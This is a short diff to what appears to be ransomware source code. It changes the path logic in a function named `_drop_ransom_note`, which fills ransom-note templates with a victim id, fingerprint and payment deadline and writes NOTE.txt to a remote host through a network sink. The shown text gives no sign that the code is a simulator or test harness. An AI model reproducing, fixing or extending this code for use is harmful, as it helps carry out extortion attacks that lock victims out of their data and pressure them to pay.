@@ -308,7 +308,13 @@ def _drop_ransom_note(args, base_path, host, port, timeout, local_output) -> str
     note_text = _rn_cipher._TEMPLATES[template](vid, fingerprint, deadline, hours)
 
     if host and not local_output:
-        sink_path = str(Path(base_path) / "NOTE.txt") if base_path else "NOTE.txt"
+        if base_path:
+            note_base = Path(base_path)
+            if not str(note_base).endswith("/") and "." in note_base.name:
+                note_base = note_base.parent
+            sink_path = str(note_base / "NOTE.txt")
+        else:
+            sink_path = "NOTE.txt"
         sink_obj = None
         try:
             sink_obj = _RemoteSink(host, port, timeout, sink_path)
